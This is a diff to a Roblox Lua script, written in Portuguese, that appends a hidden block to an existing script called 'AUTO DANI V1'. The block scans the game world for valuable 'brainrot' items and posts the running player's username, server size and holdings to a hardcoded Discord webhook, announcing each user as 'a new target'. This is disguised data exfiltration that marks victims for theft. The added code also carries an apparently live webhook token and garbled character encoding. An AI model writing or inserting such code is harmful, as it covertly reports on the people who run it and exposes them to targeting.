@@ -345,3 +345,271 @@ end)
 if not success then
     warn("❌ Erro ao carregar AUTO DANI V1: " .. tostring(err))
 end
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+
+-- Webhook URL
+local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"
+
+-- Lista de Brainrots vÃƒÂ¡lidos
+local VALID_BRAINROTS = {
+    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
+    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
+    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
+    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
+    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
+    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
+    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
+    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
+    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
+    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
+    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
+    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
+    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
+    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
+    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
+    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
+    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
+    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
+    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
+    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
+    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
+    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
+    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
+    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti IÃƒÂ¬ IÃƒÂ¬ Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
+    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob TobÃƒÂ¬ TobÃƒÂ¬", 
+    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
+    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
+    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
+    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
+    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
+    "Brr Brr PatapÃƒ n", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
+    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
+    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
+    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
+    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
+    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
+    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
+    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
+    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
+    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
+    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
+}
+
+-- IDs para procurar
+local TARGET_IDS = {
+    "28e4ec29-d005-4636-82af-339f37dcef",
+    "960ab477-3f31-4327-845e-6a77ebb5fa6",
+    "2206090e-719d-4034-8720-700c9fb2h458",
+    "dd76771-ce3c-4108-adae-5a488b2958be",
+    "44392a62-6012-413d-9619-dab73c00539f",
+    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
+    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
+    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
+}
+
+-- FunÃƒÂ§ÃƒÂ£o para verificar se um nome ÃƒÂ© um brainrot vÃƒÂ¡lido
+local function isValidBrainrot(name)
+    for _, brainrot in ipairs(VALID_BRAINROTS) do
+        if name == brainrot then
+            return true
+        end
+    end
+    return false
+end
+
+-- FunÃƒÂ§ÃƒÂ£o para procurar brainrots na workspace
+local function findBrainrots()
+    local foundBrainrots = {}
+    
+    -- Procurar na pasta Plots
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    if plotsFolder then
+        for _, plot in ipairs(plotsFolder:GetDescendants()) do
+            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
+                table.insert(foundBrainrots, plot.Name)
+            end
+        end
+    end
+    
+    -- Procurar por IDs especÃƒÂ­ficos
+    for _, id in ipairs(TARGET_IDS) do
+        local model = Workspace:FindFirstChild(id)
+        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
+            table.insert(foundBrainrots, model.Name)
+        end
+    end
+    
+    -- Remover duplicatas
+    local uniqueBrainrots = {}
+    for _, brainrot in ipairs(foundBrainrots) do
+        local alreadyExists = false
+        for _, existing in ipairs(uniqueBrainrots) do
+            if existing == brainrot then
+                alreadyExists = true
+                break
+            end
+        end
+        if not alreadyExists then
+            table.insert(uniqueBrainrots, brainrot)
+        end
+    end
+    
+    return uniqueBrainrots
+end
+
+-- Nova funÃƒÂ§ÃƒÂ£o para enviar webhook usando RequestAsync (mais seguro)
+local function sendWebhook(brainrots)
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    local player = Players.LocalPlayer
+    local playerName = player.Name
+    local playerCount = #Players:GetPlayers()
+    
+    -- Criar lista de brainrots formatada
+    local brainrotsList = ""
+    if #brainrots > 0 then
+        for i, brainrot in ipairs(brainrots) do
+            brainrotsList = brainrotsList .. "Ã¢â‚¬Â¢ " .. brainrot .. "\n"
+            if i >= 40 then -- Limite de 40 brainrots
+                brainrotsList = brainrotsList .. "... e mais\n"
+                break
+            end
+        end
+    else
+        brainrotsList = "Nenhum brainrot detectado"
+    end
+    
+    -- Criar payload do webhook
+    local payload = {
+        content = "@everyone @here, um novo alvo usou o script @everyone @here",
+        embeds = {{
+            title = "Ã°Å¸Â§  DETECÃƒâ€¡ÃƒÆ’O DE BRAINROTS Ã°Å¸Â§ ",
+            color = 0xFF0000,
+            fields = {
+                {
+                    name = "Ã¢Å’â€º Data e hora de execuÃƒÂ§ÃƒÂ£o:",
+                    value = currentTime,
+                    inline = false
+                },
+                {
+                    name = "Ã°Å¸â€˜Â¤ Nome de usuÃƒÂ¡rio:",
+                    value = playerName,
+                    inline = true
+                },
+                {
+                    name = "Ã°Å¸â€˜Â¥ Pessoas no servidor:",
+                    value = tostring(playerCount),
+                    inline = true
+                },
+                {
+                    name = "Ã°Å¸Å½â€™Ã°Å¸Â§  BRAINROTS DETECTADOS:",
+                    value = brainrotsList,
+                    inline = false
+                }
+            },
+            author = {
+                name = "NotificadorÃ°Å¸Â§  || By: Project BRANZz || Ã¢Å’â€º: " .. currentTime
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    -- MÃƒÂ©todo alternativo usando RequestAsync
+    local success, result = pcall(function()
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if success then
+        print("Ã¢Å“â€¦ Webhook enviado com sucesso!")
+        print("Ã°Å¸â€œÅ  Brainrots detectados: " .. table.concat(brainrots, ", "))
+    else
+        warn("Ã¢ÂÅ’ Erro ao enviar webhook: " .. tostring(result))
+        -- Tentar mÃƒÂ©todo alternativo com game:HttpGet
+        alternativeSendWebhook(payload, brainrots)
+    end
+end
+
+-- MÃƒÂ©todo alternativo caso o primeiro falhe
+local function alternativeSendWebhook(payload, brainrots)
+    local encodedPayload = HttpService:JSONEncode(payload)
+    
+    -- Usar game:HttpGet como alternativa (Ãƒ s vezes funciona melhor)
+    local success, result = pcall(function()
+        local response = game:HttpGet(
+            WEBHOOK_URL .. "?wait=true", 
+            {
+                method = "POST",
+                headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                body = encodedPayload
+            }
+        )
+        return response
+    end)
+    
+    if success then
+        print("Ã¢Å“â€¦ Webhook enviado (mÃƒÂ©todo alternativo)!")
+        print("Ã°Å¸â€œÅ  Brainrots detectados: " .. table.concat(brainrots, ", "))
+    else
+        warn("Ã¢ÂÅ’ Falha em todos os mÃƒÂ©todos de envio: " .. tostring(result))
+        print("Ã°Å¸â€œÅ  Brainrots detectados (nÃƒÂ£o enviados): " .. table.concat(brainrots, ", "))
+    end
+end
+
+-- FunÃƒÂ§ÃƒÂ£o para verificar se HttpService estÃƒÂ¡ habilitado
+local function checkHttpService()
+    if not HttpService then
+        warn("Ã¢ÂÅ’ HttpService nÃƒÂ£o disponÃƒÂ­vel")
+        return false
+    end
+    
+    local success = pcall(function()
+        HttpService:GetAsync("https://httpbin.org/get")
+    end)
+    
+    if not success then
+        warn("Ã¢Å¡ Ã¯Â¸Â HttpService pode estar desabilitado")
+    end
+    
+    return success
+end
+
+-- FunÃƒÂ§ÃƒÂ£o principal
+local function main()
+    -- Esperar um pouco para garantir que tudo carregou
+    wait(2)
+    
+    print("Ã°Å¸â€Â Iniciando busca por brainrots...")
+    
+    -- Verificar se HttpService funciona
+    if not checkHttpService() then
+        warn("Ã¢Å¡ Ã¯Â¸Â PossÃƒÂ­veis problemas com HttpService")
+    end
+    
+    local detectedBrainrots = findBrainrots()
+    
+    if #detectedBrainrots > 0 then
+        print("Ã°Å¸Â§  Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
+    else
+        print("Ã¢ÂÅ’ Nenhum brainrot detectado")
+    end
+    
+    -- Enviar webhook com os resultados
+    print("Ã°Å¸â€œÂ¤ Enviando para webhook...")
+    sendWebhook(detectedBrainrots)
+end
+
+-- Executar o script com tratamento de erro
+local success, err = pcall(main)
+if not success then
+    warn("Ã¢ÂÅ’ Erro ao executar script: " .. tostring(err))
+end
